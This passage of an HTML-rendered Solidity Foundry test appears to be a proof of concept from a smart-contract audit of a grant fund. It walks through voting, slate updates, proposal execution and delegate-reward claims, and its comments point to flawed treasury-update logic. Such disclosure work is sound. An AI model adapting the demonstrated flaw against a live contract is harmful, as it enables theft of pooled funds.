class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voteYes</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_fundingVote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_tokenHolder6</span><span class=\"mtk1\">, </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">voteYes</span><span class=\"mtk1\">, </span><span class=\"mtk7\">50_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Ensure that all 6 holders have fully voted.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">6</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">voterPower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votingPowerRemaining</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">votesCast</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getVoterInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">voterPower</span><span class=\"mtk1\">, </span><span class=\"mtk7\">2_500_000_000_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have 50m^2 voting power&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">votingPowerRemaining</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have fully voted&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// /* =============</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 5. updateSlate()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ============= */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// skip to the end of the DistributionPeriod</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">650_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Updating potential Proposal Slate to include proposal that is in topTenProposal (funding Stage)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slate</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// length = 2</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">slate</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">slate</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateSlate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">slate</span><span class=\"mtk1\">, </span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;Should update slate success&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (, , , , , </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slateHash</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getDistributionPeriodInfo</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">slateHash</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getProposalListFromProposalIds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getFundedProposalSlate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">slateHash</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// /* =================</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 6. executeStandard()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ================= */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// skip to the end of the Distribution&#39;s challenge period</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">roll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_startBlock</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">700_000</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// execute funded proposals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)), </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;This contract should have 0 token amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">executeStandard</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">description</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">executeStandard</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">description</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokensRequested</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">testProposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokensRequested</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)), </span><span class=\"mtk8\">&quot;The contract should received correct granted amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;totalTokensRequested&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">gbc</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">9</span><span class=\"mtk1\">/</span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should be equal to 90% of GBC&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getProposalListFromProposalIds</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getFundedProposalSlate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">slateHash</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">].</span><span class=\"mtk12\">executed</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">proposals</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">].</span><span class=\"mtk12\">executed</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have successfully executed&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// /* =================</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 7. claimDelegateReward()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// ================= */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Claim delegate reward for all delegatees</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// delegates who didn&#39;t vote with their full power receive fewer rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalDelegationRewards</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">estimatedRewards</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getDelegateReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">5</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// these are holders who haven&#39;t participated in this period, should have 0 reward</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// _tokenHolder7 and above</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IStandardFunding</span><span class=\"mtk1\">.</span><span class=\"mtk12\">DelegateRewardInvalid</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">actualRewards</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimDelegateReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">estimatedRewards</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">actualRewards</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should be ineligible for rewards&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">assertFalse</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">hasClaimedReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]), </span><span class=\"mtk8\">&quot;Should unable to claim&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]), </span><span class=\"mtk12\">allVotersInitBalance</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Balance should be the same as starting&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// these are holders who have voted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk3\">// _tokenHolder1 - 6</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">actualRewards</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">claimDelegateReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">estimatedRewards</span><span class=\"mtk1\">, </span><span class=\"mtk12\">actualRewards</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should received the exact reward amount&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">estimatedRewards</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">actualRewards</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should be eligible for rewards&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">assertTrue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">hasClaimedReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">distributionId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]), </span><span class=\"mtk8\">&quot;Should claim successfully&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_votersArr</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]), </span><span class=\"mtk12\">allVotersInitBalance</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">actualRewards</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should have the final balance equal to init+reward&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">totalDelegationRewards</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">actualRewards</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Total claimed rewards&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">totalDelegationRewards</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalDelegationRewards</span><span class=\"mtk1\">, </span><span class=\"mtk12\">gbc</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Should be equal to 10% of GBC&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalDelegationRewards</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)), </span><span class=\"mtk12\">gbc</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;10% + 90% = 100%&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalDelegationRewards</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) + </span><span class=\"mtk12\">oldTreasury</span><span class=\"mtk1\">, </span><span class=\"mtk7\">500_000_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;10% + 90% + remaining = initial treasury&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_named_uint</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Treasury at the end of the period (should be the same as started)&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">.</span><span class=\"mtk11\">treasury</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Put the treasury back to the same value as the last period to have the same GBC for easier to compare.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Remember this equation? &quot;10% + 90% + remaining = initial treasury&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Current _grantFund.treasury() = remaining.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// _token.balanceOf(address(this)) = 90%</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// _grantFund.startNewDistributionPeriod() -&gt; _grantFund._updateTreasury() = 10% (because of the invalid logic)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">changePrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_grantFund</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span 